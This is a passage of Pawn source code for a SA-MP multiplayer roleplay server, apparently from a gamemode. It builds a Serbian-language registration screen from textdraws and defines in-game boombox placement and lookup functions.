		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][3], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][3], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][3], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][3], 0);

		Register_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 543.166687, 136.573196, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][4], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][4], 2.000000, 15.849970);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][4], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][4], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][4], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][4], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][4], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][4], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][4], 0);

		Register_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 543.288574, 151.113235, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][5], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][5], 14.339982, 2.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][5], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][5], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][5], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][5], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][5], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][5], 0);

		Register_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 556.133605, 133.168487, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][6], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][6], 2.000000, 19.850019);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][6], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][6], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][6], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][6], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][6], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][6], 0);

		Register_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 485.966888, 185.231079, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][7], 0.000000, 1.100651);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][7], 615.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][7], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][7], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][7], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][7], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][7], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][7], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][7], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][7], 0);

		Register_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 485.822357, 200.266708, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][8], 0.000000, 1.056205);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][8], 615.030029, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][8], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][8], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][8], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][8], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][8], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][8], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][8], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][8], 0);

		Register_pTD[playerid][9] = CreatePlayerTextDraw(playerid, 485.822265, 214.899948, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][9], 0.000000, 1.056205);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][9], 615.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][9], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][9], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][9], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][9], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][9], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][9], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][9], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][9], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][9], 0);

		Register_pTD[playerid][10] = CreatePlayerTextDraw(playerid, 486.077819, 229.024154, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][10], 0.000000, 1.056205);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][10], 615.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][10], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][10], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][10], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][10], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][10], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][10], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][10], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][10], 0);

		Register_pTD[playerid][11] = CreatePlayerTextDraw(playerid, 485.922241, 243.857437, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][11], 0.000000, 6.211762);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][11], 548.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][11], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][11], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][11], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][11], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][11], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][11], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][11], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][11], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][11], 0);

		Register_pTD[playerid][12] = CreatePlayerTextDraw(playerid, 552.822265, 243.762145, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][12], 0.000000, 6.252655);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][12], 614.390380, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][12], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][12], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][12], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][12], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][12], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][12], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][12], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][12], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][12], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][12], 0);

		Register_pTD[playerid][13] = CreatePlayerTextDraw(playerid, 484.010986, 117.046554, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][13], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][13], 90.000000, 1.190000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][13], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][13], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][13], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][13], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][13], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][13], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][13], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][13], 0);

		Register_pTD[playerid][14] = CreatePlayerTextDraw(playerid, 574.688903, 113.942268, ".........");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][14], 0.155221, 0.558399);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][14], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][14], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][14], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][14], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][14], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][14], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][14], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][14], 0);

		Register_pTD[playerid][15] = CreatePlayerTextDraw(playerid, 521.077331, 167.711212, "www.ultimate-rpg.com");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][15], 0.118220, 0.634000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][15], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][15], 1115865343);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][15], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][15], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][15], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][15], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][15], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][15], 0);

		Register_pTD[playerid][16] = CreatePlayerTextDraw(playerid, 530.399719, 161.926727, "dobrodosli");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][16], 0.150444, 0.733466);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][16], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][16], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][16], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][16], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][16], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][16], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][16], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][16], 0);

		Register_pTD[playerid][17] = CreatePlayerTextDraw(playerid, 551.277954, 186.813278, "lozinka");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][17], 0.150444, 0.733466);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][17], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][17], 2);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][17], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][17], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][17], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][17], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][17], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][17], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][17], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][17], true);

		Register_pTD[playerid][18] = CreatePlayerTextDraw(playerid, 551.477600, 201.348739, "email");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][18], 0.150444, 0.733466);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][18], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][18], 2);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][18], 255);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][18], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][18], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][18], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][18], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][18], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][18], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][18], true);

		Register_pTD[playerid][19] = CreatePlayerTextDraw(playerid, 551.877807, 215.786437, "godine");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][19], 0.150444, 0.733466);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][19], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][19], 2);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][19], 255);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][19], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][19], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][19], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][19], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][19], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][19], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][19], true);

		Register_pTD[playerid][20] = CreatePlayerTextDraw(playerid, 551.232971, 230.122085, "drzava");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][20], 0.150444, 0.733466);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][20], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][20], 2);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][20], 255);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][20], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][20], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][20], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][20], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][20], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][20], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][20], true);

		Register_pTD[playerid][21] = CreatePlayerTextDraw(playerid, 551.759399, 301.701904, "odaberite_vas_skin_(listanjem)");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][21], 0.110444, 0.594222);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][21], 2);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][21], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][21], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][21], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][21], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][21], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][21], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][21], 0);

		Register_pTD[playerid][22] = CreatePlayerTextDraw(playerid, 525.266601, 294.335205, "musko");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][22], 0.136444, 0.584222);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][22], 3);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][22], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][22], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][22], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][22], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][22], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][22], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][22], 0);

		Register_pTD[playerid][23] = CreatePlayerTextDraw(playerid, 593.511169, 294.237579, "zensko");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][23], 0.136444, 0.584222);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][23], 3);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][23], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][23], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][23], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][23], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][23], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][23], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][23], 0);

		Register_pTD[playerid][24] = CreatePlayerTextDraw(playerid, 489.522216, 243.695343, "");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][24], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][24], 52.000000, 51.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][24], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][24], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][24], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][24], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][24], 0);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][24], 5);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][24], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][24], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][24], true);
		PlayerTextDrawSetPreviewModel(playerid, Register_pTD[playerid][24], MALE_SKIN);
		PlayerTextDrawSetPreviewRot(playerid, Register_pTD[playerid][24], 0.000000, 0.000000, 0.000000, 1.000000);

		Register_pTD[playerid][25] = CreatePlayerTextDraw(playerid, 554.944885, 244.393234, "");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][25], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][25], 52.000000, 51.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][25], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][25], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][25], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][25], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][25], 0);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][25], 5);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][25], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][25], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][25], true);
		PlayerTextDrawSetPreviewModel(playerid, Register_pTD[playerid][25], FEMALE_SKIN);
		PlayerTextDrawSetPreviewRot(playerid, Register_pTD[playerid][25], 0.000000, 0.000000, 0.000000, 1.000000);

		Register_pTD[playerid][26] = CreatePlayerTextDraw(playerid, 485.633361, 311.155303, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][26], 0.000000, 1.151883);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][26], 614.800781, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][26], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][26], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][26], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][26], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][26], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][26], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][26], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][26], 0);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][26], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][26], 0);

		Register_pTD[playerid][27] = CreatePlayerTextDraw(playerid, 484.566650, 310.600006, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][27], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][27], 65.610343, 11.819993);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][27], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][27], 1115865178);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][27], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][27], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][27], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][27], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][27], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][27], 0);

		Register_pTD[playerid][28] = CreatePlayerTextDraw(playerid, 550.966308, 310.602264, "LD_SPAC:white");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][28], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][28], 64.749946, 11.819993);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][28], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][28], 1115865178);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][28], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][28], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][28], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][28], 4);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][28], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][28], 0);

		Register_pTD[playerid][29] = CreatePlayerTextDraw(playerid, 485.477722, 326.295196, "box");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][29], 0.000000, 0.600992);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][29], 615.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][29], 1);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][29], -1);
		PlayerTextDrawUseBox(playerid, Register_pTD[playerid][29], 1);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][29], 90);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][29], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][29], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][29], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][29], 1);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][29], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][29], 0);

		Register_pTD[playerid][30] = CreatePlayerTextDraw(playerid, 550.717773, 325.595275, "NASTAVITE_>>");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][30], 0.124777, 0.617407);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][30], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][30], 2);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][30], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][30], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][30], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][30], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][30], 2);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][30], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][30], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][30], true);

		Register_pTD[playerid][31] = CreatePlayerTextDraw(playerid, 516.403564, 310.064392, "<<");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][31], 0.302666, 1.345245);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][31], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][31], 2);
		PlayerTextDrawBoxColor(playerid, Register_pTD[playerid][31], 0);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][31], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][31], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][31], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][31], 3);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][31], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][31], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][31], true);

		Register_pTD[playerid][32] = CreatePlayerTextDraw(playerid, 583.687133, 310.064392, ">>");
		PlayerTextDrawLetterSize(playerid, Register_pTD[playerid][32], 0.302666, 1.345245);
		PlayerTextDrawTextSize(playerid, Register_pTD[playerid][32], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, Register_pTD[playerid][32], 2);
		PlayerTextDrawColor(playerid, Register_pTD[playerid][32], -1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][32], 0);
		PlayerTextDrawSetOutline(playerid, Register_pTD[playerid][32], 0);
		PlayerTextDrawBackgroundColor(playerid, Register_pTD[playerid][32], 255);
		PlayerTextDrawFont(playerid, Register_pTD[playerid][32], 3);
		PlayerTextDrawSetProportional(playerid, Register_pTD[playerid][32], 1);
		PlayerTextDrawSetShadow(playerid, Register_pTD[playerid][32], 0);
		PlayerTextDrawSetSelectable(playerid, Register_pTD[playerid][32], true);

	    for( new i = 0; i < 33; i ++) PlayerTextDrawShow( playerid, Register_pTD[ playerid ][ i ] );

	    ShowedRegister[ playerid ] = true;
	}
	else if( show == false )
	{
		for( new i = 0; i < 33; i ++)
		{
			PlayerTextDrawHide( playerid, Register_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Register_pTD[ playerid ][ i ] );
			Register_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}

		ShowedRegister[ playerid ] = false;
	}
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
_:public Boombox_Place( playerid )
{
	static Float:angle;
	GetPlayerFacingAngle(playerid, angle);

	strpack(BoomboxInfo[ playerid ][boomboxURL], "", 128 char);
	GetPlayerPos(playerid, BoomboxInfo[ playerid ][ boomboxPos ][ 0], BoomboxInfo[ playerid ][ boomboxPos ][ 1], BoomboxInfo[ playerid ][ boomboxPos ][ 2] );

	BoomboxInfo[ playerid ][boomboxPlaced] = true;
	BoomboxInfo[ playerid ][boomboxInterior] = GetPlayerInterior(playerid);
	BoomboxInfo[ playerid ][boomboxWorld] = GetPlayerVirtualWorld(playerid);

    new string[ 150 ];
	format( string, sizeof( string ), "(BOOMBOX)\nVlasnik: {FFFFFF}%s\n{4282C0}('/radio url' - da postavis pesmu)\n('/radio podigni' - da podignes svoj radio)", ImeIgraca( playerid ) );

    BoomboxInfo[ playerid ][boomboxObject] = CreateDynamicObject(2103, BoomboxInfo[ playerid ][ boomboxPos ][ 0], BoomboxInfo[ playerid ][ boomboxPos ][ 1], BoomboxInfo[ playerid ][ boomboxPos ][ 2] - 0.9, 0.0, 0.0, angle, BoomboxInfo[ playerid ][boomboxWorld], BoomboxInfo[ playerid ][boomboxInterior] );
    BoomboxInfo[ playerid ][boomboxText3D] = CreateDynamic3DTextLabel( string, 0x4282C0FF, BoomboxInfo[ playerid ][ boomboxPos ][ 0], BoomboxInfo[ playerid ][ boomboxPos ][ 1], BoomboxInfo[ playerid ][ boomboxPos ][ 2] - 0.7, 10.0, IPI, IVI, 0, BoomboxInfo[ playerid ][boomboxWorld], BoomboxInfo[ playerid ][boomboxInterior] );
	return 1;
}

_:public Boombox_Nearest(playerid)
{
	foreach(new i : Player)
	{
		if(BoomboxInfo[ i ][boomboxPlaced] && GetPlayerInterior(playerid) == BoomboxInfo[ i ][boomboxInterior] && GetPlayerVirtualWorld(playerid) == BoomboxInfo[ i ][boomboxWorld] && IsPlayerInRangeOfPoint(playerid, 30.0, BoomboxInfo[ i ][boomboxPos][ 0 ], BoomboxInfo[ i ][boomboxPos][ 1 ], BoomboxInfo[ i ][boomboxPos][2 ] ) )
		{
     		return i;
